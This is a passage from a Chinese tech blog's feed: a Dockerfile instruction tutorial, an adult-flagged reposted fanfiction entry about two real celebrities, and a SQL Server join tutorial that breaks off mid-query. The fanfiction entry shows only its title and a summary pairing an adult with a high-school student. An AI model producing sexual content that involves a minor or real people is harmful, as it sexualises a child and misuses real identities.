<h3>COPY</h3><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">COPY </span><span class="pun">[--</span><span class="pln">chown</span><span class="pun">=&lt;</span><span class="pln">user</span><span class="pun">&gt;:&lt;</span><span class="kwd">group</span><span class="pun">&gt;]</span><span class="pln"> </span><span class="pun">&lt;源路径</span><span class="lit">1</span><span class="pun">&gt;...</span><span class="pln">  </span><span class="pun">&lt;目标路径&gt;</span><span class="pln">COPY </span><span class="pun">[--</span><span class="pln">chown</span><span class="pun">=&lt;</span><span class="pln">user</span><span class="pun">&gt;:&lt;</span><span class="kwd">group</span><span class="pun">&gt;]</span><span class="pln"> </span><span class="pun">[</span><span class="str">"&lt;源路径1&gt;"</span><span class="pun">,...</span><span class="pln">  </span><span class="str">"&lt;目标路径&gt;"</span><span class="pun">]</span></pre><p><strong>[--chown=&lt;user&gt;:&lt;group&gt;]</strong>：可选参数，用户改变复制到容器内文件的拥有者和属组。</p><p><strong>&lt;源路径&gt;</strong>：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如：</p><pre class="prettyprint prettyprinted" style><span class="pln">COPY hom</span><span class="pun">*</span><span class="pln"> </span><span class="str">/mydir/</span><span class="pln">COPY hom</span><span class="pun">?.</span><span class="pln">txt </span><span class="pun">/</span><span class="pln">mydir</span><span class="pun">/</span></pre><p><strong>&lt;目标路径&gt;</strong>：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p><h3>ADD</h3><p>ADD 指令和 COPY 的使用格式一致（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p><ul><li>ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</li><li>ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。</li></ul><h3>CMD</h3><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p><ul><li>CMD 在docker run 时运行。</li><li>RUN 是在 docker build。</li></ul><p><strong>作用</strong>：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">CMD </span><span class="pun">&lt;</span><span class="pln">shell </span><span class="pun">命令&gt;</span><span class="pln"> CMD </span><span class="pun">[</span><span class="str">"&lt;可执行文件或命令&gt;"</span><span class="pun">,</span><span class="str">"&lt;param1&gt;"</span><span class="pun">,</span><span class="str">"&lt;param2&gt;"</span><span class="pun">,...]</span><span class="pln"> CMD </span><span class="pun">[</span><span class="str">"&lt;param1&gt;"</span><span class="pun">,</span><span class="str">"&lt;param2&gt;"</span><span class="pun">,...]</span><span class="pln">  </span><span class="com"># 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></pre><p>推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。</p><h3>ENTRYPOINT</h3><p>类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p><p>但是, 如果运行 docker run 时使用了 --entrypoint 选项，将覆盖 CMD 指令指定的程序。</p><p><strong>优点</strong>：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">ENTRYPOINT </span><span class="pun">[</span><span class="str">"&lt;executeable&gt;"</span><span class="pun">,</span><span class="str">"&lt;param1&gt;"</span><span class="pun">,</span><span class="str">"&lt;param2&gt;"</span><span class="pun">,...]</span></pre><p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参，以下示例会提到。</p><p>示例：</p><p>假设已通过 Dockerfile 构建了 nginx:test 镜像：</p><pre class="prettyprint prettyprinted" style><span class="pln">FROM nginx<p>ENTRYPOINT </p></span><span class="pun">[</span><span class="str">“nginx”</span><span class="pun">,</span><span class="pln"> </span><span class="str">“-c”</span><span class="pun">]</span><span class="pln"> </span><span class="com"># 定参</span><span class="pln"><br>CMD </span><span class="pun">[</span><span class="str">“/etc/nginx/nginx.conf”</span><span class="pun">]</span><span class="pln"> </span><span class="com"># 变参 </span></pre><p></p><p>1、不传参运行</p><pre class="prettyprint prettyprinted" style><span class="pln">$ docker run  nginx</span><span class="pun">:</span><span class="pln">test</span></pre><p>容器内会默认运行以下命令，启动主进程。</p><pre class="prettyprint prettyprinted" style><span class="pln">nginx </span><span class="pun">-</span><span class="pln">c </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">.</span><span class="pln">conf</span></pre><p>2、传参运行</p><pre class="prettyprint prettyprinted" style><span class="pln">$ docker run  nginx</span><span class="pun">:</span><span class="pln">test </span><span class="pun">-</span><span class="pln">c </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">/</span><span class="kwd">new</span><span class="pun">.</span><span class="pln">conf</span></pre><p>容器内会默认运行以下命令，启动主进程(/etc/nginx/new.conf:假设容器内已有此文件)</p><pre class="prettyprint prettyprinted" style><span class="pln">nginx </span><span class="pun">-</span><span class="pln">c </span><span class="pun">/</span><span class="pln">etc</span><span class="pun">/</span><span class="pln">nginx</span><span class="pun">/</span><span class="kwd">new</span><span class="pun">.</span><span class="pln">conf</span></pre><h3>ENV</h3><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">ENV </span><span class="str">&lt;key&gt;</span><span class="pln"> </span><span class="str">&lt;value&gt;</span><span class="pln">ENV </span><span class="str">&lt;key1&gt;</span><span class="pun">=&lt;</span><span class="pln">value1</span><span class="pun">&gt;</span><span class="pln"> </span><span class="str">&lt;key2&gt;</span><span class="pun">=&lt;</span><span class="pln">value2</span><span class="pun">&gt;...</span></pre><p>以下示例设置 NODE_VERSION = 7.2.0 ， 在后续的指令中可以通过 $NODE_VERSION 引用：</p><pre class="prettyprint prettyprinted" style><span class="pln">ENV NODE_VERSION </span><span class="lit">7.2</span><span class="pun">.</span><span class="lit">0</span><span class="pln"><p>RUN curl </p></span><span class="pun">-</span><span class="pln">SLO </span><span class="str">“<a href="https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz&quot;">https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz&quot;</a></span><span class="pln"> <br> </span><span class="pun">&amp;&amp;</span><span class="pln"> curl </span><span class="pun">-</span><span class="pln">SLO </span><span class="str">“<a href="https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc&quot;">https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc&quot;</a></span></pre><p></p><h3>ARG </h3><p>构建参数，与 ENV 作用一至。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。</p><p>构建命令 docker build 中可以用 --build-arg &lt;参数名&gt;=&lt;值&gt; 来覆盖。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">ARG </span><span class="pun">&lt;参数名&gt;[=&lt;默认值&gt;]</span></pre><h3>VOLUME</h3><p>定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷。</p><p>作用：</p><ul><li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li><li>避免容器不断变大。</li></ul><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">VOLUME </span><span class="pun">[</span><span class="str">"&lt;路径1&gt;"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"&lt;路径2&gt;"</span><span class="pun">...]</span><span class="pln">VOLUME </span><span class="pun">&lt;路径&gt;</span></pre><p>在启动容器 docker run 的时候，我们可以通过 -v 参数修改挂载点。</p><h3>EXPOSE </h3><p>仅仅只是声明端口。</p><p>作用：</p><ul><li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</li><li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</li></ul><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">EXPOSE </span><span class="pun">&lt;端口</span><span class="lit">1</span><span class="pun">&gt;</span><span class="pln"> </span><span class="pun">[&lt;端口</span><span class="lit">2</span><span class="pun">&gt;...]</span></pre><h3>WORKDIR</h3><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p><p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">WORKDIR </span><span class="pun">&lt;工作目录路径&gt;</span></pre><h3>USER </h3><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">USER </span><span class="pun">&lt;用户名&gt;[:&lt;用户组&gt;]</span></pre><h3>HEALTHCHECK</h3><p>用于指定某个程序或者指令来监控 docker 容器服务的运行状态。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">HEALTHCHECK </span><span class="pun">[选项]</span><span class="pln"> CMD </span><span class="pun">&lt;命令&gt;：设置检查容器健康状况的命令</span><span class="pln">HEALTHCHECK NONE</span><span class="pun">：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</span><span class="pln"><p>HEALTHCHECK </p></span><span class="pun">[选项]</span><span class="pln"> CMD </span><span class="pun">&lt;命令&gt;</span><span class="pln"> </span><span class="pun">:</span><span class="pln"> </span><span class="pun">这边</span><span class="pln"> CMD </span><span class="pun">后面跟随的命令使用，可以参考</span><span class="pln"> CMD </span><span class="pun">的用法。</span></pre><p></p><h3>ONBUILD </h3><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为 test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这是执行新镜像的 Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。</p><p>格式：</p><pre class="prettyprint prettyprinted" style><span class="pln">ONBUILD </span><span class="pun">&lt;其它指令&gt;</span></pre>            <!-- 其他扩展 --></div></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;!--页面头部添加--&gt;

&lt;h1 id=&quot;docker&quot;&gt;&lt;a href=&quot;#docker&quot; class=&quot;headerlink&quot; title=&quot;docker&quot;&gt;&lt;/a&gt;docker&lt;/h
      
    
    </summary>
    
    
      <category term="docker" scheme="https://www.nikoyu.asia/categories/docker/"/>
    
    
      <category term="IT" scheme="https://www.nikoyu.asia/tags/IT/"/>
    
      <category term="docker" scheme="https://www.nikoyu.asia/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>《下坠》王一博/肖战Chapter 1</title>
    <link href="https://www.nikoyu.asia/%E3%80%8A%E4%B8%8B%E5%9D%A0%E3%80%8B%E7%8E%8B%E4%B8%80%E5%8D%9A&amp;%E8%82%96%E6%88%98Chapter%201%EF%BC%88%E6%9C%AA%E6%88%90%E5%B9%B4%E4%BA%BA%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E6%9C%AC%E9%A1%B5%EF%BC%81%EF%BC%89.html"/>
    <id>https://www.nikoyu.asia/%E3%80%8A%E4%B8%8B%E5%9D%A0%E3%80%8B%E7%8E%8B%E4%B8%80%E5%8D%9A&amp;%E8%82%96%E6%88%98Chapter%201%EF%BC%88%E6%9C%AA%E6%88%90%E5%B9%B4%E4%BA%BA%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E6%9C%AC%E9%A1%B5%EF%BC%81%EF%BC%89.html</id>
    <published>2020-03-03T06:42:17.000Z</published>
    <updated>2020-09-17T03:20:45.605Z</updated>
    
    <content type="html"><![CDATA[<h1 id="未成年人禁止访问本页！！！本站不负责"><a href="#未成年人禁止访问本页！！！本站不负责" class="headerlink" title="未成年人禁止访问本页！！！本站不负责"></a>未成年人禁止访问本页！！！本站不负责</h1><p><br><br><br><img data-src="https://cdn.jsdelivr.net/gh/yujiajie01/imgHosting/yujiajie01-picfbi.jpg" class="lazyload"></p><p><br><br><br><br><br><br><br><br><br><br><br><br></p><blockquote><p>文章为转载内容，阅读原文请科学上网访问：<a href=" https://archiveofourown.org/works/22478632/chapters/53712151" rel="nofollow">传送门</a></p></blockquote><h2 class="title heading">      《下坠》/MaiLeDiDiDi       </h2><h3>Summary:（女装大佬）发廊妹x男高中生</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;未成年人禁止访问本页！！！本站不负责&quot;&gt;&lt;a href=&quot;#未成年人禁止访问本页！！！本站不负责&quot; class=&quot;headerlink&quot; title=&quot;未成年人禁止访问本页！！！本站不负责&quot;&gt;&lt;/a&gt;未成年人禁止访问本页！！！本站不负责&lt;/h1&gt;&lt;p&gt;&lt;br&gt;&lt;b
      
    
    </summary>
    
    
      <category term="同人小说" scheme="https://www.nikoyu.asia/categories/%E5%90%8C%E4%BA%BA%E5%B0%8F%E8%AF%B4/"/>
    
    
      <category term="《下坠》" scheme="https://www.nikoyu.asia/tags/%E3%80%8A%E4%B8%8B%E5%9D%A0%E3%80%8B/"/>
    
  </entry>
  
  <entry>
    <title>SQL 深入&quot;了解&quot; sqlserver 表连接 join　及性能调优化</title>
    <link href="https://www.nikoyu.asia/SQL%E6%B7%B1%E5%85%A5%E2%80%9C%E4%BA%86%E8%A7%A3%E2%80%9D%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html"/>
    <id>https://www.nikoyu.asia/SQL%E6%B7%B1%E5%85%A5%E2%80%9C%E4%BA%86%E8%A7%A3%E2%80%9D%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html</id>
    <published>2020-01-15T03:44:29.000Z</published>
    <updated>2020-09-17T03:20:45.600Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><!--页面头部添加--><h1 id="SQL-深入”了解”-sqlserver-表连接-join-及性能调优化"><a href="#SQL-深入”了解”-sqlserver-表连接-join-及性能调优化" class="headerlink" title="SQL  深入”了解”  sqlserver 表连接 join　及性能调优化"></a>SQL  深入”了解”  sqlserver 表连接 join　及性能调优化</h1><p>　问题 :</p><div id="cnblogs_post_body"><p>　　　　　1.什么是内连接(inner)和外联结(outer)</p><p>　　　　　2. SQL server 表连接 (FROM--AND 法, JOIN -- ON 法)的区别.</p><p>　　　　　3.表连接及多表连接的SQL语句执行顺序,和性能调优.</p><hr><h2 id="1-第一个问题，首先要明白如何使用JOIN-和-ON-关键字作表连接。"><a href="#1-第一个问题，首先要明白如何使用JOIN-和-ON-关键字作表连接。" class="headerlink" title="1.第一个问题，首先要明白如何使用JOIN 和 ON 关键字作表连接。"></a>1.第一个问题，首先要明白如何使用JOIN 和 ON 关键字作表连接。</h2><p>　　　　<span style="color: #cc99ff;">申明：下文中所用的等价，可能指的是逻辑上的等价(即产生相同的结果集)，也可能是执行顺序上的等价，甚至是所产生的执行计划或者执行效率等价。因为很多时候用户只要写普通的sql ，而sql server 会跟据自己的优化 配置和执行计划，产生执行步骤，这些步骤也许和你写的sql很符合，也许更优，当然也可能不符合你的需求。这需要很多的积累，我也只是浅尝辄止，所以没有能力做过多论述。具体问题具体分析，这里只能提供大体思路。</span></p><h3 id="1）join-的5种方式-："><a href="#1）join-的5种方式-：" class="headerlink" title="1）join 的5种方式 ："></a>1）join 的5种方式 ：</h3><p>　　　　inner join ; left join; right join; full join; cross join;</p><p>　　　　其中inner&nbsp; join可以省去inner 关键字。 left/right join 与left/right out join 等价。</p><p>　　　　full join 与 同时 left join&nbsp;和 right join 等价。</p><p>　　　　cross join 为将两张表笛卡尔集　　　</p><p>　</p><hr><p>&nbsp;</p><h3 id="2-JOIN-–-ON-语句的执行顺序："><a href="#2-JOIN-–-ON-语句的执行顺序：" class="headerlink" title="2) JOIN – ON 语句的执行顺序："></a>2) JOIN – ON 语句的执行顺序：</h3><p>　　　　例句：</p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM A <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN B <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">= B.ID <span style="color: #808080;">AND A<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0 <span style="color: #0000ff;">WHERE A.name <span style="color: #808080;">= <span style="color: #ff0000;">'<span style="color: #ff0000;">x<span style="color: #ff0000;">'  </span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></div><p>　　　　注意在作on&nbsp; 连接后 的and 子句 和where 子句 。&nbsp; 他们有什么不同！。。。。。。</p><p>　　　<strong>　逻辑上解释：(不考虑执行计划中执行步骤和作嵌套连接等具体方式，这里只讨论如何思考逻辑上的步骤)　</strong></p><p>　　　　　　　　执行顺序是： FROM --&gt; JOIN --&gt; ON --&gt;AND--&gt;　LEFT--&gt; WHERE --&gt;SELECT</p><p>　　　　　　　　A步骤. 先将两张表根据ON 条件 作连接（逻辑上，相等于将两张表笛卡尔集后根据ID相等条件筛选数据，实际情况后面分析）　</p><p>　　　　　　　　B步骤. 根据ON 后面,WHERE&nbsp;之前&nbsp;的 AND 条件筛选数据</p><p>　　　　　　　　C步骤. 跟据LEFT 无论如何，要保证A表的数据完整性。所以在上一步骤产生的结果集中<span style="color: #ff0000;">补齐A表因无法比与B表匹配而被AND 条件筛选的掉的数据；</span></p><p>　　　　　　　　D步骤. 再根据WHERE筛选结果集。　</p><p>　　　　示例：（为了能更好的这一过程，通过实例先思考）</p><p>　　　　　　　　</p><div class="cnblogs_code"><pre><span style="color: #0000ff;">CREATE <span style="color: #0000ff;">TABLE EMPLOY  (NAME    <span style="color: #0000ff;">VARCHAR(<span style="color: #800000; font-weight: bold;">10),     DEPTNO    <span style="color: #0000ff;">INTEGER<span style="color: #000000;"> );     <p><span style="color: #0000ff;">INSERT <span style="color: #0000ff;">INTO EMPLOY (NAME, DEPTNO) <span style="color: #0000ff;">VALUES<span style="color: #000000;"><br> (<span style="color: #ff0000;">‘<span style="color: #ff0000;">张三<span style="color: #ff0000;">‘,<span style="color: #800000; font-weight: bold;">10<span style="color: #000000;">),<br> (<span style="color: #ff0000;">‘<span style="color: #ff0000;">李四<span style="color: #ff0000;">‘,<span style="color: #800000; font-weight: bold;">20<span style="color: #000000;">),<br> (<span style="color: #ff0000;">‘<span style="color: #ff0000;">王五<span style="color: #ff0000;">‘,<span style="color: #800000; font-weight: bold;">10<span style="color: #000000;">),<br> (<span style="color: #ff0000;">‘<span style="color: #ff0000;">赵红<span style="color: #ff0000;">‘,<span style="color: #800000; font-weight: bold;">20<span style="color: #000000;">);    </p><p><span style="color: #0000ff;">CREATE <span style="color: #0000ff;">TABLE DEPARTMENT  (DEPTNO    <span style="color: #0000ff;">INTEGER,      DEPTNAME    <span style="color: #0000ff;">VARCHAR(<span style="color: #800000; font-weight: bold;">10<span style="color: #000000;">) ); </p><p><span style="color: #0000ff;">INSERT <span style="color: #0000ff;">INTO DEPARTMENT (DEPTNO, DEPTNAME) <span style="color: #0000ff;">VALUES<span style="color: #000000;"><br>(<span style="color: #800000; font-weight: bold;">10, <span style="color: #ff0000;">‘<span style="color: #ff0000;">市场部<span style="color: #ff0000;">‘<span style="color: #000000;">),<br>(<span style="color: #800000; font-weight: bold;">20, <span style="color: #ff0000;">‘<span style="color: #ff0000;">技术部<span style="color: #ff0000;">‘<span style="color: #000000;">);</p><p><span style="color: #008080;">–<span style="color: #008080;">查询一下所有的员工的姓名和部门名为市场部的部门 </span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></p><p>　　　　</p><p>也许你的SQL 会写成这样：</p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT<span style="color: #000000;"> E.NAME,D.DEPTNAME <span style="color: #0000ff;">FROM EMPLOY  E <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN DEPARTMENT D <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=<span style="color: #000000;">D.DEPTNO   <span style="color: #0000ff;">WHERE D.DEPTNAME<span style="color: #808080;">=<span style="color: #ff0000;">'<span style="color: #ff0000;">市场部<span style="color: #ff0000;">' </span></span></span></span></span></span></span></span></span></span></span></span></span></pre></div><p>仔细读题目，是要查询“所有”员工的姓名，所以肯定要保证员工表的数据完整性。如果使用where，当然不能保证员工表的完整拉。</p><p>还记得 <span style="color: #ff0000;">在 ON 关键字后 ，WHERE 关键字前的条件筛选方式么？？？</span></p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT E.NAME,D.DEPTNAME <span style="color: #0000ff;">FROM EMPLOY  E <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN DEPARTMENT D <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=D.DEPTNO <span style="color: #808080;">AND D.DEPTNAME<span style="color: #808080;">=<span style="color: #ff0000;">'<span style="color: #ff0000;">市场部<span style="color: #ff0000;">'  </span></span></span></span></span></span></span></span></span></span></span></pre></div><p>这样就对了！！</p><p>产生的结果很奇怪</p><p>张三&nbsp;市场部 李四&nbsp;NULL 王五&nbsp;市场部 赵红&nbsp;NULL</p><p>为什么结果是这样呢？　深入理解下前面所说的SQL 语句执行顺序&nbsp;</p><p>　　　　举个例子：分别执行看看结果，结合上个例子想想(以下ABC步骤意思是前面说的ABCD四个步骤)</p><div class="cnblogs_code"><pre><span style="color: #008080;">--<span style="color: #008080;">执行A步骤等价的逻辑SQL<span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM EMPLOY  E   <span style="color: #808080;">JOIN DEPARTMENT D   <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=<span style="color: #000000;">D.DEPTNO<span style="color: #008080;">--<span style="color: #008080;">执行B步骤等价的逻辑SQL<span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM EMPLOY  E   <span style="color: #808080;">JOIN DEPARTMENT D   <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=D.DEPTNO <span style="color: #808080;">and  D.DEPTNO<span style="color: #808080;">=<span style="color: #800000; font-weight: bold;">40<span style="color: #008080;">--<span style="color: #008080;">执行C步骤等价的逻辑SQL<span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM EMPLOY  E  <span style="color: #808080;">left <span style="color: #808080;">JOIN DEPARTMENT D   <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=D.DEPTNO <span style="color: #808080;">and  D.DEPTNO<span style="color: #808080;">=<span style="color: #800000; font-weight: bold;">40</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre><h3 id="3-表连接在执行计划，或者是真正的执行方式："><a href="#3-表连接在执行计划，或者是真正的执行方式：" class="headerlink" title="3)表连接在执行计划，或者是真正的执行方式："></a>3)表连接在执行计划，或者是真正的执行方式：</h3><p>　　首先要理解下执行计划，看看SQL语句如何在　SQL SERVER&nbsp;&nbsp; 内部中真正实现这些复杂操作；其中SQL SERVER JOIN 的三种方式（<span style="color: #ff0000;">Nested Loops join，Merge Join，Hash Join）要有所了解。如果不懂，可以去<a href="http://www.cnblogs.com/fish-li/archive/2011/06/06/2073626.html">http://www.cnblogs.com/fish-li/archive/2011/06/06/2073626.html</a>　看看学习。</span></p><p>　　我的私人理解：</p><p>　　　　A. Nested Loops join :外表县进行逐条扫描，而内表，根据ＯＮ的连接条件，快速ＳＥＥＫ内表看是否有符合的数据（ＳＥＥＫ不是ＳＣＡＮ）。这样产生两张表ＪＯＩＮ后集合。</p><p>　　　&nbsp; B. Merge Join : 用于两张表差不多大，而且在连接字段上有索引。</p><p>　　　 C.&nbsp;&nbsp;Hash Join : 两张表都是数据量很大。</p><p>　　虽然不是太明白具体如何判断，但是ＳＱＬ　ＳＥＲＶＥＲ　会自动判断使用哪种方式，所以不需要太关心，除非是做ＤＢＡ的。重点了解下<span style="color: #ff0000;">Nested Loops join。</span></p><p>&nbsp;</p><hr><h3 id="FROM-JOIN-ON-AND-WHERE-总结"><a href="#FROM-JOIN-ON-AND-WHERE-总结" class="headerlink" title="FROM , JOIN , ON , AND , WHERE  总结"></a>FROM , JOIN , ON , AND , WHERE  总结</h3><p><span style="color: #ff0000;"><span style="color: #000000;">　　铺垫了这么多，终于回到关键问题：　平时看到很多ＳＱＬ　写法　有的用WHERE&nbsp; and 进行表连接，有的用JOIN ON 作表连接。这里面不能随便，写不好即影响结果，又阻碍执行效率。可以查看更多详细资料：<a href="http://blog.csdn.net/shangboerds/article/details/5213264">http://blog.csdn.net/shangboerds/article/details/5213264</a></span></span></p><p><span style="color: #ff0000;"><span style="color: #000000;">　　　　</span></span></p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT E.NAME,D.DEPTNAME <span style="color: #0000ff;">FROM EMPLOY  E <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN DEPARTMENT D <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=<span style="color: #000000;">D.DEPTNO   <span style="color: #0000ff;">WHERE D.DEPTNAME<span style="color: #808080;">=<span style="color: #ff0000;">'<span style="color: #ff0000;">市场部<span style="color: #ff0000;">' <p><span style="color: #0000ff;">SELECT E.NAME,D.DEPTNAME <span style="color: #0000ff;">FROM EMPLOY  E <span style="color: #808080;">LEFT <span style="color: #808080;">JOIN DEPARTMENT D <span style="color: #0000ff;">ON E.DEPTNO<span style="color: #808080;">=<span style="color: #000000;">D.DEPTNO<br><span style="color: #808080;">AND D.DEPTNAME<span style="color: #808080;">=<span style="color: #ff0000;">‘<span style="color: #ff0000;">市场部<span style="color: #ff0000;">‘<br><span style="color: #008080;">–<span style="color: #008080;"> 不论逻辑上还是结果上都不等价</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></p><p>&nbsp;</p><h2 id="现实SQL查询中，一般都不止两个表连接，一般是多表连接查询！"><a href="#现实SQL查询中，一般都不止两个表连接，一般是多表连接查询！" class="headerlink" title="现实SQL查询中，一般都不止两个表连接，一般是多表连接查询！"></a>现实SQL查询中，一般都不止两个表连接，一般是多表连接查询！</h2><p>　　<span style="color: #ff0000;"> <span style="color: #000000;">几个常见错误：</span></span></p><p><span style="color: #ff0000;">　　<span style="color: #000000;">１。胡乱使用LEFT join　：由于分析过执行步骤, LEFT&nbsp;关键字是要在“两张”表连接完成后（思考下多表连接），再对表相当于进行扫描部全的过程，所以会耗费很多时间。</span></span></p><p><span style="color: #ff0000;"><span style="color: #000000;">　　２。分不清表连接 (FROM--AND 法, JOIN -- ON 法)的区别；如下两个SQL:</span></span></p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT <span style="color: #808080;">*<span style="color: #0000ff;">FROM<span style="color: #000000;"> A <span style="color: #0000ff;">INNER <span style="color: #808080;">JOIN B <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">= B.ID <span style="color: #808080;">AND B<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0<span style="color: #0000ff;">INNER <span style="color: #808080;">JOIN C <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">= B.ID <span style="color: #808080;">AND C<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0<span style="color: #0000ff;">SELECT <span style="color: #808080;">*<span style="color: #0000ff;">FROM<span style="color: #000000;"> A <span style="color: #0000ff;">INNER <span style="color: #808080;">JOIN B <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">=<span style="color: #000000;"> B.ID <span style="color: #0000ff;">INNER <span style="color: #808080;">JOIN C <span style="color: #0000ff;">ON A.ID <span style="color: #808080;">=<span style="color: #000000;"> B.ID <span style="color: #0000ff;">WHERE<span style="color: #000000;">     B<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0<span style="color: #808080;">AND C<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0<span style="color: #008080;">--<span style="color: #008080;">此写法效率比上面两种都差,尤其表越多,效果越明显</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></div><p>&nbsp;</p><p>　　　思考表连接的的ＳＱＬ执行顺序。。。前者两张表ＪＯＩＮ　后　马上筛选部分结果在与另一张表ＪＯＩＮ　。后者先将三张表ＪＯＩＮ后再筛选。所以很明显前者效率比后者高.</p><p>　　３。再添加一条SQL :</p><p>　　</p><div class="cnblogs_code"><pre><span style="color: #0000ff;">SELECT <span style="color: #808080;">* <span style="color: #0000ff;">FROM<span style="color: #000000;"> A 